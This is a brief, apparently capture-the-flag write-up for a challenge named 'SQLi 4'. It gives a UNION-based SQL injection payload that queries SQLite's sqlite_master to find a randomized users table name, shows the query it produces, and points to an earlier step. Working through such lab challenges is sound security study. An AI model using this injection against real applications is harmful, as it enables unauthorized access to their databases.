# SQLi 4

Since the server uses sqlite \
Query: admin" UNION SELECT tbl_name FROM sqlite_master WHERE tbl_name LIKE "users%

SQL Query formed (REDACTED is the randomized name of users table)

```sql
SELECT username FROM REDACTED WHERE username LIKE "admin" UNION SELECT tbl_name FROM sqlite_master WHERE tbl_name LIKE "users%"
```

This gives the name os the users table, now do same as [SQLi 3](./SQLi%203.md)
